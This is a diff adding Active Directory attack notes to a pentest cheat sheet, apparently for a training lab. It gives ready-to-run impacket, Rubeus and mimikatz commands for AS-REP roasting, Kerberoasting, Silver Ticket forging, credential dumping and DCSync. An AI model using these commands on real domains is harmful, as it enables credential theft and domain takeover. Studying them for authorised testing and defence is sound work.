@@ -1,5 +1,49 @@
 > Also comprehensive: [AD Enumeration Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#domain-enumeration)
-# Manual Approach
+
+# Attack AD Authentication
+## AS-REP Roasting
+requires the AD user account option `Do not require Kerberos preauthentication` to be enabled. To check:
+- Predefined Analysis in Bloodhound or
+- PowerView’s Get-DomainUser function with the option `-PreauthNotRequired` (Windows)
+- `impacket-GetNPUsers -dc-ip $ip_dc $domain/$user` (kali)
+If we have GenericWrite or GenericAll on a user account, we can also enable this option our selfes ("Targeted AS-REP Roasting"). To attack:
+```bash
+impacket-GetNPUsers -dc-ip $ip_dc -request -outputfile hashes.asreproast $domain/$user
+```
+You can also use `-usersfile` to specify a list of usernames
+Alternative on Windows: `Rubeus.exe asreproast /outfile:hashes.asreproast`
+Then, crack the AS-REP hash with hashcat, see [[8_Hashes_cheatsheet#Hashcat]]
+
+### Kerberoasting
+Similar as AS-REP Roasting. But we attack a Service Ticket, not a TGT. We can extract password hashes from both, but this targets an SPN's service account, not a user account. As this requires a TGT, we either need to run it from a domain joined pc or provide impacket with any valid AD credentials.
+> Only target SPN's running in the context of a user account. Otherwise, the password is randomly generated and infeasible to crack. The same is true for user `krbtgt`. With the right permissions, we could also set an SPN for any user account ("targeted Kerberoasting").
+```bash
+sudo impacket-GetUserSPNs -dc-ip $ip_dc -request -outputfile hashes.kerberoast $domain/$user
+```
+On error `KRB_AP_ERR_SKEW`: Synchronize kali's clock with the AD, using `ntpdate` or `rdate`
+Alternative on Windows: `Rubeus.exe kerberoast /outfile:hashes.kerberoast`
+Then, crack the TGS-REP hash with hashcat, see [[8_Hashes_cheatsheet#Hashcat]]
+
+### Silver Ticket
+Forge a service ticket. Requires:
+- Domain SID (e.g. with `whoami`. It‘s an AD user's SID without the last value field)
+- Target SPN (See output of the previous `impacket-GetUserSPNs` command)
+- SPN NTLM Password Hash (e.g. mimikatz on a system with a session. `privilege::debug` and `sekurlsa::logonpasswords`)
+```mimikatz
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /domain:corp.com /ptt /user:jeffadmin
+```
+> As we forge this ticket, we can select and user we want. Here, it's jeffadmin. A patch enforced since Oct. 22 denies the creation of service tickets for non-existent users. `/ptt` injects the ticket directly into memory.
+
+### DC Synchronization
+Requires user with `Replicating Directory Changes`, `Replicating Directory Changes All`, and `Replicating Directory Changes in Filtered Set` rights (by default: Domain Admins, Enterprise Admins, and Administrators).
+Then, we can act as DC ourselfes and request all AD user's password hashes.
+```mimikatz
+lsadump::dcsync /user:corp\dave
+```
+Alternative on Kali: `impacket-secretsdump -just-dc-user $uname_target $domain/$uname_privileged:$password_privileged@$ip_dc` (e.g. `dave corp.com/jeffadmin:"Flowers1"@192.168.50.70`)
+
+
+# Manual  Enumeration Approach
 ### Primary DC (PDC):
 ```powershell
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
